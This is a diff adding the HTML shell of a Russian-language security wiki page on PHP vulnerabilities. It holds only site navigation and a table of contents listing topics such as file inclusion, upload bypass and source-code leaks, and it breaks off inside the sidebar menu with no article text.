@@ -1,0 +1,2505 @@
+
+<!doctype html>
+<html lang="ru" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <meta name="author" content="anakilivo">
+      
+      
+      <link rel="shortcut icon" href="../../assets/horde.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.7">
+    
+    
+      
+        <title>PHP - Horde Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.cb6bc1d0.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.39b8e14a.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#ef5552">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="">
+      
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          Перейти к содержанию
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="../.." title="Horde Wiki" class="md-header-nav__button md-logo" aria-label="Horde Wiki">
+      
+  <img src="../../assets/horde.png" alt="logo">
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            Horde Wiki
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              PHP
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Поиск" placeholder="Поиск" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header-nav__source">
+        
+<a href="https://github.com/anakilivo/wiki/" title="Перейти к репозиторию" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zM277.3 415.7c-8.4 1.5-11.5-3.7-11.5-8 0-5.4.2-33 .2-55.3 0-15.6-5.2-25.5-11.3-30.7 37-4.1 76-9.2 76-73.1 0-18.2-6.5-27.3-17.1-39 1.7-4.3 7.4-22-1.7-45-13.9-4.3-45.7 17.9-45.7 17.9-13.2-3.7-27.5-5.6-41.6-5.6-14.1 0-28.4 1.9-41.6 5.6 0 0-31.8-22.2-45.7-17.9-9.1 22.9-3.5 40.6-1.7 45-10.6 11.7-15.6 20.8-15.6 39 0 63.6 37.3 69 74.3 73.1-4.8 4.3-9.1 11.7-10.6 22.3-9.5 4.3-33.8 11.7-48.3-13.9-9.1-15.8-25.5-17.1-25.5-17.1-16.2-.2-1.1 10.2-1.1 10.2 10.8 5 18.4 24.2 18.4 24.2 9.7 29.7 56.1 19.7 56.1 19.7 0 13.9.2 36.5.2 40.6 0 4.3-3 9.5-11.5 8-66-22.1-112.2-84.9-112.2-158.3 0-91.8 70.2-161.5 162-161.5S388 165.6 388 257.4c.1 73.4-44.7 136.3-110.7 158.3zm-98.1-61.1c-1.9.4-3.7-.4-3.9-1.7-.2-1.5 1.1-2.8 3-3.2 1.9-.2 3.7.6 3.9 1.9.3 1.3-1 2.6-3 3zm-9.5-.9c0 1.3-1.5 2.4-3.5 2.4-2.2.2-3.7-.9-3.7-2.4 0-1.3 1.5-2.4 3.5-2.4 1.9-.2 3.7.9 3.7 2.4zm-13.7-1.1c-.4 1.3-2.4 1.9-4.1 1.3-1.9-.4-3.2-1.9-2.8-3.2.4-1.3 2.4-1.9 4.1-1.5 2 .6 3.3 2.1 2.8 3.4zm-12.3-5.4c-.9 1.1-2.8.9-4.3-.6-1.5-1.3-1.9-3.2-.9-4.1.9-1.1 2.8-.9 4.3.6 1.3 1.3 1.8 3.3.9 4.1zm-9.1-9.1c-.9.6-2.6 0-3.7-1.5s-1.1-3.2 0-3.9c1.1-.9 2.8-.2 3.7 1.3 1.1 1.5 1.1 3.3 0 4.1zm-6.5-9.7c-.9.9-2.4.4-3.5-.6-1.1-1.3-1.3-2.8-.4-3.5.9-.9 2.4-.4 3.5.6 1.1 1.3 1.3 2.8.4 3.5zm-6.7-7.4c-.4.9-1.7 1.1-2.8.4-1.3-.6-1.9-1.7-1.5-2.6.4-.6 1.5-.9 2.8-.4 1.3.7 1.9 1.8 1.5 2.6z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    anakilivo/wiki
+  </div>
+</a>
+      </div>
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Horde Wiki" class="md-nav__button md-logo" aria-label="Horde Wiki">
+      
+  <img src="../../assets/horde.png" alt="logo">
+
+    </a>
+    Horde Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      
+<a href="https://github.com/anakilivo/wiki/" title="Перейти к репозиторию" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zM277.3 415.7c-8.4 1.5-11.5-3.7-11.5-8 0-5.4.2-33 .2-55.3 0-15.6-5.2-25.5-11.3-30.7 37-4.1 76-9.2 76-73.1 0-18.2-6.5-27.3-17.1-39 1.7-4.3 7.4-22-1.7-45-13.9-4.3-45.7 17.9-45.7 17.9-13.2-3.7-27.5-5.6-41.6-5.6-14.1 0-28.4 1.9-41.6 5.6 0 0-31.8-22.2-45.7-17.9-9.1 22.9-3.5 40.6-1.7 45-10.6 11.7-15.6 20.8-15.6 39 0 63.6 37.3 69 74.3 73.1-4.8 4.3-9.1 11.7-10.6 22.3-9.5 4.3-33.8 11.7-48.3-13.9-9.1-15.8-25.5-17.1-25.5-17.1-16.2-.2-1.1 10.2-1.1 10.2 10.8 5 18.4 24.2 18.4 24.2 9.7 29.7 56.1 19.7 56.1 19.7 0 13.9.2 36.5.2 40.6 0 4.3-3 9.5-11.5 8-66-22.1-112.2-84.9-112.2-158.3 0-91.8 70.2-161.5 162-161.5S388 165.6 388 257.4c.1 73.4-44.7 136.3-110.7 158.3zm-98.1-61.1c-1.9.4-3.7-.4-3.9-1.7-.2-1.5 1.1-2.8 3-3.2 1.9-.2 3.7.6 3.9 1.9.3 1.3-1 2.6-3 3zm-9.5-.9c0 1.3-1.5 2.4-3.5 2.4-2.2.2-3.7-.9-3.7-2.4 0-1.3 1.5-2.4 3.5-2.4 1.9-.2 3.7.9 3.7 2.4zm-13.7-1.1c-.4 1.3-2.4 1.9-4.1 1.3-1.9-.4-3.2-1.9-2.8-3.2.4-1.3 2.4-1.9 4.1-1.5 2 .6 3.3 2.1 2.8 3.4zm-12.3-5.4c-.9 1.1-2.8.9-4.3-.6-1.5-1.3-1.9-3.2-.9-4.1.9-1.1 2.8-.9 4.3.6 1.3 1.3 1.8 3.3.9 4.1zm-9.1-9.1c-.9.6-2.6 0-3.7-1.5s-1.1-3.2 0-3.9c1.1-.9 2.8-.2 3.7 1.3 1.1 1.5 1.1 3.3 0 4.1zm-6.5-9.7c-.9.9-2.4.4-3.5-.6-1.1-1.3-1.3-2.8-.4-3.5.9-.9 2.4-.4 3.5.6 1.1 1.3 1.3 2.8.4 3.5zm-6.7-7.4c-.4.9-1.7 1.1-2.8.4-1.3-.6-1.9-1.7-1.5-2.6.4-.6 1.5-.9 2.8-.4 1.3.7 1.9 1.8 1.5 2.6z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    anakilivo/wiki
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../index.ru" class="md-nav__link">
+        Главная
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" >
+      
+      <label class="md-nav__link" for="nav-2">
+        Разное
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Разное" data-md-level="1">
+        <label class="md-nav__title" for="nav-2">
+          <span class="md-nav__icon md-icon"></span>
+          Разное
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1" >
+      
+      <label class="md-nav__link" for="nav-2-1">
+        Архив
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Архив" data-md-level="2">
+        <label class="md-nav__title" for="nav-2-1">
+          <span class="md-nav__icon md-icon"></span>
+          Архив
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/archive/rar.ru" class="md-nav__link">
+        Rar
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/archive/zip.ru" class="md-nav__link">
+        Zip
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-2" type="checkbox" id="nav-2-2" >
+      
+      <label class="md-nav__link" for="nav-2-2">
+        Аудио
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Аудио" data-md-level="2">
+        <label class="md-nav__title" for="nav-2-2">
+          <span class="md-nav__icon md-icon"></span>
+          Аудио
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/audio/introduction.ru" class="md-nav__link">
+        Введение
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3" >
+      
+      <label class="md-nav__link" for="nav-2-3">
+        Дисковая Память
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Дисковая Память" data-md-level="2">
+        <label class="md-nav__title" for="nav-2-3">
+          <span class="md-nav__icon md-icon"></span>
+          Дисковая Память
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/disk-memory/introduction.ru" class="md-nav__link">
+        Введение
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-4" type="checkbox" id="nav-2-4" >
+      
+      <label class="md-nav__link" for="nav-2-4">
+        Кодирование
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Кодирование" data-md-level="2">
+        <label class="md-nav__title" for="nav-2-4">
+          <span class="md-nav__icon md-icon"></span>
+          Кодирование
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/encode/communication.ru" class="md-nav__link">
+        Общение
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/encode/encodings.ru" class="md-nav__link">
+        Кодировки
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/encode/modern.ru" class="md-nav__link">
+        Современные
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5" >
+      
+      <label class="md-nav__link" for="nav-2-5">
+        Изображения
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Изображения" data-md-level="2">
+        <label class="md-nav__title" for="nav-2-5">
+          <span class="md-nav__icon md-icon"></span>
+          Изображения
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/pictures/introduction.ru" class="md-nav__link">
+        Введение
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/pictures/jpg.ru" class="md-nav__link">
+        JPG (JPEG)
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/pictures/png.ru" class="md-nav__link">
+        PNG
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/pictures/gif.ru" class="md-nav__link">
+        GIF
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-6" type="checkbox" id="nav-2-6" >
+      
+      <label class="md-nav__link" for="nav-2-6">
+        Другое
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Другое" data-md-level="2">
+        <label class="md-nav__title" for="nav-2-6">
+          <span class="md-nav__icon md-icon"></span>
+          Другое
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/other/pyc.ru" class="md-nav__link">
+        Pyc
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
+      
+      <label class="md-nav__link" for="nav-3">
+        Веб
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Веб" data-md-level="1">
+        <label class="md-nav__title" for="nav-3">
+          <span class="md-nav__icon md-icon"></span>
+          Веб
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../introduction.ru" class="md-nav__link">
+        Введение
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          PHP
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="" class="md-nav__link md-nav__link--active">
+        PHP
+      </a>
+      
+        
+<nav class="md-nav md-nav--secondary" aria-label="Содержание">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Содержание
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    Файл содержит
+  </a>
+  
+    <nav class="md-nav" aria-label="Файл содержит">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    Локальный файл содержит
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    Удаленный файл содержит
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#file-upload" class="md-nav__link">
+    File Upload
+  </a>
+  
+    <nav class="md-nav" aria-label="File Upload">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    Обход проверки загрузки
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    Переменный охват
+  </a>
+  
+    <nav class="md-nav" aria-label="Переменный охват">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    Переопределение глобальной переменной
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#extract" class="md-nav__link">
+    extract() переопределение переменной
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#import_request_variables" class="md-nav__link">
+    import_request_variables Переопределение переменной
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#parse_str" class="md-nav__link">
+    parse_str() переопределение переменной
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    Выполнение команды
+  </a>
+  
+    <nav class="md-nav" aria-label="Выполнение команды">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    Код прямого исполнения
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#preg_replace" class="md-nav__link">
+    preg_replace() Выполнение кода
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#preg_match" class="md-nav__link">
+    preg_match Выполнение кода
+  </a>
+  
+    <nav class="md-nav" aria-label="preg_match Выполнение кода">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_get" class="md-nav__link">
+    Построить _GET чтение
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_get_1" class="md-nav__link">
+    Получить параметр _GET
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    Входящие параметры
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    Динамическое выполнение функции
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    Выполнение команды обратной кавычки
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    Фигурный синтаксис
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    Функция обратного вызова
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    Десериализация
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    PHP особенности
+  </a>
+  
+    <nav class="md-nav" aria-label="PHP особенности">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    Массив
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    Волшебный хеш
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    Шестнадцатеричное преобразование
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    Преобразование типов
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    Свободность параметров встроенных функций
+  </a>
+  
+    <nav class="md-nav" aria-label="Свободность параметров встроенных функций">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#md5" class="md-nav__link">
+    md5()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#strcmp" class="md-nav__link">
+    strcmp()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#switch" class="md-nav__link">
+    switch()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#in_array" class="md-nav__link">
+    in_array()
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    Ищем резервную копию исходного кода
+  </a>
+  
+    <nav class="md-nav" aria-label="Ищем резервную копию исходного кода">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#hg" class="md-nav__link">
+    hg утечка исходного кода
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#git" class="md-nav__link">
+    Утечки исходного кода Git
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ds_store" class="md-nav__link">
+    .DS_Store Утечка файла
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#-" class="md-nav__link">
+    Файл резервной копии веб-сайта
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#svn" class="md-nav__link">
+    Утечка SVN
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web-inf-webxml" class="md-nav__link">
+    Утечка WEB-INF / web.xml
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cvs" class="md-nav__link">
+    Утечка CVS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    Рекомендации
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqli.ru" class="md-nav__link">
+        Sqli
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../xss.ru" class="md-nav__link">
+        XSS
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssrf.ru" class="md-nav__link">
+        SSRF
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../csrf.ru" class="md-nav__link">
+        CSRF
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" >
+      
+      <label class="md-nav__link" for="nav-4">
+        Криптография
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Криптография" data-md-level="1">
+        <label class="md-nav__title" for="nav-4">
+          <span class="md-nav__icon md-icon"></span>
+          Криптография
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/introduction.ru" class="md-nav__link">
+        Введение
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4-2" type="checkbox" id="nav-4-2" >
+      
+      <label class="md-nav__link" for="nav-4-2">
+        Ассиметрическая
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Ассиметрическая" data-md-level="2">
+        <label class="md-nav__title" for="nav-4-2">
+          <span class="md-nav__icon md-icon"></span>
+          Ассиметрическая
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4-2-1" type="checkbox" id="nav-4-2-1" >
+      
+      <label class="md-nav__link" for="nav-4-2-1">
+        Пространственная Решетка
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Пространственная Решетка" data-md-level="3">
+        <label class="md-nav__title" for="nav-4-2-1">
+          <span class="md-nav__icon md-icon"></span>
+          Пространственная Решетка
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/lattice/introduction.ru" class="md-nav__link">
+        Введение
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/lattice/overview.ru" class="md-nav__link">
+        Обзор
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/lattice/lattice-reduction.ru" class="md-nav__link">
+        Решетка-редукции
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/lattice/cvp.ru" class="md-nav__link">
+        CVP
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4-2-2" type="checkbox" id="nav-4-2-2" >
+      
+      <label class="md-nav__link" for="nav-4-2-2">
+        Дискретный Логарифм
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Дискретный Логарифм" data-md-level="3">
+        <label class="md-nav__title" for="nav-4-2-2">
+          <span class="md-nav__icon md-icon"></span>
+          Дискретный Логарифм
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/discrete-log/introduction.ru" class="md-nav__link">
+        Введение
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/discrete-log/elgamal.ru" class="md-nav__link">
+        Эль-Гамаль
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
